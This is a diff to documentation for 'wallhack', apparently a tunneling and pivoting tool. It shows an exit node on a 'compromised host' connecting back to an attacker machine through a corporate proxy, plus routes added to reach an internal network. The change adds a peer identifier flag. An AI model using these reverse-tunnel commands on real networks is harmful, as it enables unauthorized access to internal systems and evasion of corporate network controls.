@@ -20,11 +20,11 @@ An [entry node](/concepts) listening for WebSocket connections on TCP/443.
 {% /step %}
 
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
-An [exit node](/concepts) connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting.
+An [exit node](/concepts) connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting. The `-i` flag sets a stable peer identifier used when adding routes.
 
 ```bash
 export HTTPS_PROXY=http://proxy.corp.internal:8080
-wallhack exit --connect 192.168.1.5:443/tcp
+wallhack exit --connect 192.168.1.5:443/tcp -i peer1
 ```
 {% /step %}
 
@@ -33,7 +33,7 @@ Add routes for the networks accessible through the compromised host. Use the wal
 
 **Via the wallhack REPL** (on the entry node):
 ```
-wallhack> route add 10.10.0.0/24
+wallhack> route add 10.10.0.0/24 via peer1
 ```
 
 **Via the system `ip` tool** (on the attacker machine):
